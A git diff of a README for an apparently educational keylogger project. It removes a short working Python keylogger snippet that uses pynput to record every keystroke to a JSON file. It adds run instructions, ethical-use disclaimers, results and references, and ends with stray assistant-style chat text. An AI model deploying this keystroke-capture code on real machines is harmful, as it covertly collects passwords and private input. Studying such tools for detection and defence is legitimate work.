@@ -28,24 +28,51 @@ The project explored the development, functionality, and ethical implications of
 
 ---
 
-## Coding Snippet
+## Usage Instructions
 
-The keylogger implementation uses Python's `pynput` library. Below is a snippet showcasing the main functionality:
+1. Clone this repository:
+   ```bash
+   git clone https://github.com/<your-username>/<your-repository>.git
 
-```python
-from pynput import keyboard
-import json
+2. Install dependencies:
+   ```bash
+   pip install pynput
 
-keys_used = []
+3. Run the keylogger in a secure environment
+   ```bash
+   python keylogger.py
 
-def on_press(key):
-    keys_used.append({'Pressed': f'{key}'})
-    with open('key_log.json', 'w') as key_log:
-        json.dump(keys_used, key_log)
+---
 
-def start_keylogger():
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
-    listener.join()
+## Ethical Considerations
 
-start_keylogger()
+- This project is intended solely for educational purposes.
+- All development and testing were conducted in controlled, ethical environments.
+- Unauthorized use of keyloggers to capture personal data is illegal and unethical.
+
+---
+
+## Results
+
+- Effectiveness: The keylogger accurately captured keystrokes, including special keys, and 
+   stored them securely.
+- Detection: Highlighted limitations of traditional antivirus software in detecting 
+  sophisticated keyloggers.
+- Prevention: Demonstrated the importance of user education and multi-layered security 
+  strategies.
+
+  ---
+
+  ## References
+
+- Modern Operating Systems (4th ed.) by Tanenbaum, A. S., & Bos, H.
+- Keylogger Detection Using Machine Learning Techniques: A Comparative Study
+- Behavioral Analysis in Malware Detection
+
+---
+
+## Acknowledgments
+  Special thanks to Edunet Foundation for their guidance during this project.
+  
+  Feel free to adjust any section according to your needs! Let me know if you'd like any 
+  modifications.
